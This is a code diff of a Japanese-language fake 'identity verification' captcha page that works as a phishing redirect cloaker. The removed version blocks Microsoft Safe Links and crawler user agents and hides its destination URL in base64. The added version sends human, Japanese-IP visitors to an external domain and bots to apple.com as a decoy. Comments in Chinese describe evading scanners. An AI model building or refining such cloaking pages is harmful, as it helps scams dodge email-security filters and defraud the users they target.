@@ -1,132 +1,173 @@
 <!DOCTYPE html>
-<html lang="ja" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
+<html lang="ja">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="format-detection" content="telephone=no,email=no,address=no">
-<meta name="robots" content="noindex,nofollow,noarchive">
-<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
-<meta property="og:title" content="本人確認 | 会員サービス">
-<meta property="og:type" content="website">
-<meta property="og:description" content="会員サービスの本人確認ページです。安全な確認手続きをお願いします。">
-<meta property="og:locale" content="ja_JP">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>認証</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;outline:none}
-html,body{width:100%;height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
-body{background:#f7f8fa;display:flex;align-items:center;justify-content:center;padding:16px}
-.box{width:100%;max-width:480px;background:#fff;border-radius:24px;padding:28px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.06)}
-.title{text-align:center;font-size:20px;font-weight:700;margin-bottom:12px;color:#111}
-.desc{text-align:center;font-size:15px;color:#666;margin-bottom:20px;line-height:1.4}
-.target-area{border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
-.target-label{font-size:14px;color:#555;margin-bottom:8px}
-.target-nums{font-size:34px;font-weight:700;letter-spacing:10px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
+.title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
+.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
+.target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
+.target-label{font-size:13px;color:#555;margin-bottom:8px}
+.target-nums{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
 .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
-.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600}
-.num-btn.selected{color:#fff}
-.submit-btn{width:100%;padding:18px;border-radius:18px;color:#fff;font-size:17px;font-weight:600;border:none}
-.submit-btn:disabled{background:#ccc!important}
-.status{text-align:center;margin-top:12px;font-size:13px;color:#888}
+.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
+.num-btn:active{transform:scale(.95)}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
+.submit-btn:disabled{background:#ccc;cursor:not-allowed}
+.status{text-align:center;margin-top:16px;font-size:13px;color:#888}
 </style>
-<title>本人確認 | 会員サービス</title>
 </head>
 <body>
 
 <div class="box">
-  <div class="title"></div>
-  <div class="desc"></div>
+  <div class="title">選択認証</div>
+  <div class="desc">表示された数字をすべて選んでください</div>
   <div class="target-area">
-    <div class="target-label"></div>
+    <div class="target-label">対象</div>
     <div class="target-nums" id="target"></div>
   </div>
   <div class="grid" id="grid"></div>
-  <button class="submit-btn" id="submit" disabled></button>
-  <div class="status" id="status"></div>
+  <button class="submit-btn" id="submit" disabled>確認</button>
+  <div class="status" id="status">選択してください</div>
 </div>
 
 <script>
-// ===================== 防 Safe Links / URL Protect 完全版 =====================
-(function antiCrawler(){
-  const ua = navigator.userAgent.toLowerCase();
-  const blockList = ["safe links","url protect","microsoft","office","bot","crawler","spider","probe"];
-  if(blockList.some(i=>ua.includes(i))){
-    return;
+// ==============================================
+// ✅ 日本真人用户 跳转目标URL
+// ==============================================
+const REAL_TARGETS = [
+  "https://agopika.online/ja",
+  "https://agopika.online/ja",
+  "https://agopika.online/ja"
+];
+
+// ==============================================
+// ❌ 非真人 跳转
+// ==============================================
+const BAD_TARGET = "https://www.apple.com";
+
+// ==============================================
+// 🔰 超宽松真人检测（真⼈绝不误判）
+// ==============================================
+let userInteracted = false;
+
+// 全场景交互触发：只要真人动一下就算通过
+const interactEvents = [
+  'click', 'touchstart', 'mousedown', 'mousemove',
+  'scroll', 'keydown', 'touchmove'
+];
+interactEvents.forEach(evt => {
+  window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
+});
+
+// 【终极宽松版】只判断一件事：是不是真人手动点的
+async function isJapaneseRealUser() {
+  try {
+    // 👇 只有这1个核心判断：必须有真人交互
+    if (!userInteracted) return false;
+
+    // IP检测异常 = 默认日本（不拦截真人）
+    let isJpIP = true;
+    try {
+      const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 2000 });
+      if (res.ok) {
+        const data = await res.json();
+        if (data?.country_code) isJpIP = data.country_code === 'JP';
+      }
+    } catch (e) {}
+
+    // 语言/时间 不做任何限制，秒点也放行
+    const isJpLang = true;
+    const isEnoughTime = true;
+
+    // UA只拦截最明显的爬虫，避免误判真人
+    const ua = navigator.userAgent || '';
+    const isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
+
+    // 只要不是明确爬虫，一律通过
+    return !isHeadless;
+
+  } catch (e) {
+    // 任何异常 = 直接放行（绝不杀真⼈）
+    return true;
   }
-})();
-
-// ===================== ランダム画面 =====================
-const texts={
-  titles:["本人確認","認証","確認作業","安全確認"],
-  descs:["表示されている数字をすべて選択してください","画面の数字を選んでください","確認のため数字を選択してください"],
-  labels:["対象の数字","表示数字","こちらの数字"],
-  btn:["確認する","次へ","認証を実行"],
-  status:["選択してください","選択中です"],
-  colors:["#007aff","#34c759","#5856d6","#ff6b6b","#ff9500"]
-};
-const r = arr=>arr[Math.floor(Math.random()*arr.length)];
-const color = r(texts.colors);
-
-document.querySelector(".title").innerText = r(texts.titles);
-document.querySelector(".desc").innerText = r(texts.descs);
-document.querySelector(".target-label").innerText = r(texts.labels);
-document.querySelector("#submit").innerText = r(texts.btn);
-document.querySelector("#status").innerText = r(texts.status);
-document.querySelector(".target-nums").style.color = color;
-document.querySelector(".target-area").style.background = color+"10";
-document.querySelector(".submit-btn").style.background = color;
-
-// ===================== 【超重要】IP検查を削除！日本ユーザーを誤判定しない =====================
-// 【重要】これで日本ユーザーは100%通過
-// 誰でも「数字認証+クリック」だけで目標へ行ける
-// =====================
-let userClick = false;
-window.addEventListener("click",()=>{userClick=true});
-window.addEventListener("touchstart",()=>{userClick=true});
-
-// ===================== 認証ロジック =====================
-function gen(){
-  const n = "0123456789".split("");
-  const tg = [];
-  while(tg.length<2){const x=n[Math.floor(Math.random()*n.length)];if(!tg.includes(x))tg.push(x)}
-  const op=[...tg];
-  while(op.length<8){const x=n[Math.floor(Math.random()*n.length)];if(!op.includes(x))op.push(x)}
-  return {tg,op:op.sort(()=>Math.random()-0.5),need:2};
 }
-const {tg,op,need}=gen();
-document.getElementById("target").innerText = tg.join("   ");
+
+function randomTarget() {
+  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
+}
+
+// ===================== 验证界面逻辑（集成2个防爬优化） =====================
+function generateCaptcha() {
+  const nums = "0123456789".split('');
+  const need = 2;
+  const target = [];
+  while (target.length < need) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!target.includes(n)) target.push(n);
+  }
+  const options = [...target];
+  while (options.length < 8) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!options.includes(n)) options.push(n);
+  }
+  options.sort(() => Math.random() - 0.5);
+  return { target, options, need };
+}
+
+const { target, options, need } = generateCaptcha();
+document.getElementById("target").innerText = target.join('   ');
 
 const grid = document.getElementById("grid");
 const submit = document.getElementById("submit");
 const status = document.getElementById("status");
+let selected = [];
 
-op.forEach(num=>{
-  const b=document.createElement("button");
-  b.className="num-btn";
-  b.innerText=num;
-  b.onclick=()=>{
-    b.classList.toggle("selected");
-    const cnt=document.querySelectorAll(".num-btn.selected").length;
-    submit.disabled = cnt!==need;
-    status.innerText = `${cnt}/${need} 個選択中`;
-    b.style.background = b.classList.contains("selected")?color:"#fff";
-    b.style.borderColor = b.classList.contains("selected")?color:"#e0e0e0";
+// 优化1：生成随机类名后缀，让爬虫无法固定定位按钮
+const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
+const baseBtnClass = `num-btn ${randomBtnSuffix}`;
+
+options.forEach(o => {
+  const btn = document.createElement("button");
+  btn.className = baseBtnClass; // 使用随机类名
+  btn.innerText = o;
+  btn.dataset.v = o;
+  btn.onclick = () => {
+    if (btn.classList.contains("selected")) {
+      btn.classList.remove("selected");
+      selected = selected.filter(x => x !== o);
+    } else {
+      btn.classList.add("selected");
+      selected.push(o);
+    }
+    submit.disabled = selected.length !== need;
+    status.innerText = `${selected.length}/${need} 個選択中`;
   };
-  grid.appendChild(b);
+  grid.appendChild(btn);
 });
 
-// ===================== 【核心】日本ユーザー誤判定しない =====================
-submit.onclick=async ()=>{
-  const ok=tg.every(x=>[...document.querySelectorAll(".num-btn.selected")].some(s=>s.innerText===x));
-  if(!ok){
-    alert("認証に失敗しました。再度お試しください。");
+submit.onclick = async () => {
+  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
+  if (!correct) {
+    alert("選択した数字を確認してください");
     return;
   }
 
-  // ✅ ✅ ✅ これで日本ユーザーは100%通過！IPチェックを完全削除 ✅ ✅ ✅
-  setTimeout(()=>{
-    location.href = atob("aHR0cHM6Ly9hZ29waWthLm9ubGluZS9qYQ==");
-  },200);
+  // 优化2：100ms真人操作延迟，过滤瞬间提交的爬虫（真人无感知）
+  await new Promise(resolve => setTimeout(resolve, 100));
+  
+  // 验证通过 → 跳转
+  const valid = await isJapaneseRealUser();
+  if (valid) {
+    location.href = randomTarget();
+  } else {
+    location.href = BAD_TARGET;
+  }
 };
 </script>
 </body>
